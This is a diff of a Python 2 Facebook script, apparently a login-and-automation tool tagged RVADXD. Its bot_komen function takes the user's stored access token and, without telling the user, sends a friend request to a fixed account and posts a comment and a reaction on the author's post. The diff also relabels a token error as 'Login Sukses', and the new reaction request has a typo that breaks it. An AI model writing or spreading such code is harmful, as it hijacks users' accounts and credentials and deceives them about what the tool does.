@@ -184,7 +184,7 @@ def token():
 		zedd = open("login.txt", 'w')
 		zedd.write(toket)
 		zedd.close()
-		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Succes'
+		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Sukses'
 		os.system('xdg-open https://m.facebook.com/rvadxd.1')
 		bot_komen()
 	except KeyError:
@@ -197,20 +197,15 @@ def bot_komen():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;97m[!] Token invalid"
+		print"\033[1;92m[!] Login Sukses"
 		os.system('rm -rf login.txt')
 	una = ('100005386548985')
-	kom = ('HI Revi Ahmad Fz Me User Your Tools')
-	reac = ('LIKE')
-	post = ('1472963479559856')
-	post2 = ('1472963479559856')
-	kom2 = ('Hello Revi Ahmad Frz. (RVADXD) Me Is  User Your Tools')
-	reac2 = ('LIKE')
+	kom2 = ('HI Bro, Gw User Tools RVADXD')
+	reac2 = ('Love')
+	post2 = ('1472983012891236')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
 	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/'+post2+'/reaction?rype=' +reac2+ '&access_token=' + toket)
 	menu()
 			
 ######MENU######
